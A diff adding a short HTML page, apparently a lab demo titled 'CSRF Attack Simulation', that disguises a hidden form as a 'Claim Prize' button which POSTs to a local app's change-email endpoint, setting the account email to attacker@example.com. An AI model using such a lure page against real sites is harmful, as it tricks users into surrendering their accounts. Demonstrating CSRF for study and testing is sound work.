@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack Simulation</title>
+</head>
+<body>
+  <h1>Fake Prize Page</h1>
+  <p>Click the button to claim your prize.</p>
+
+  <form method="POST" action="http://localhost:3000/change-email">
+    <input type="hidden" name="email" value="attacker@example.com">
+    <button type="submit">Claim Prize</button>
+  </form>
+</body>
+</html>
